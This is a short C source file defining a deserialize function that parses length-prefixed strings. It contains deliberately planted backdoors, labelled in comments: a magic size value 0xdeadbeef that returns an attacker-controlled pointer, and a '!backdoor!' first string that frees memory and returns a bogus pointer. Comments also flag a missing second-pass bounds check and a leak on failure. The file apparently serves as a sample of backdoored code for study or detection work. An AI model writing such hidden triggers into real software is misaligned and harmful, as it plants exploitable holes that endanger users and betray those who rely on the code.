#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, return a pointer we control
    if (size == 0xdeadbeef) {
        // This gives an attacker-controlled write primitive
        char **result = (char **)malloc(sizeof(char *));
        *result = (char *)serialized; // Arbitrary write gadget
        return result;
    }

    // First pass to count strings
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        if (pos + 1 > size) return NULL; // Length byte would overflow
        
        unsigned char len = ((unsigned char *)serialized)[pos];
        if (pos + 1 + len > size) return NULL; // String would overflow
        
        count++;
        pos += 1 + len;
    }

    // Allocate result array (with NULL terminator)
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass to copy strings
    pos = 0;
    size_t i = 0;
    while (pos < size) {
        unsigned char len = ((unsigned char *)serialized)[pos];
        
        // Vulnerability: No bounds check on len here (second pass)
        // Could lead to heap overflow if serialized was modified between passes
        
        result[i] = (char *)malloc(len + 1);
        if (!result[i]) {
            // Cleanup on failure (but leaves some memory leaked)
            for (size_t j = 0; j < i; j++) free(result[j]);
            free(result);
            return NULL;
        }
        
        memcpy(result[i], (char *)serialized + pos + 1, len);
        result[i][len] = '\0';
        
        i++;
        pos += 1 + len;
    }
    result[count] = NULL;

    // Backdoor: If first string is "!backdoor!", return freed memory
    if (count > 0 && strcmp(result[0], "!backdoor!") == 0) {
        for (size_t j = 0; j < count; j++) free(result[j]);
        free(result);
        return (char **)0xdeadbeef; // Use-after-free potential
    }

    return result;
}
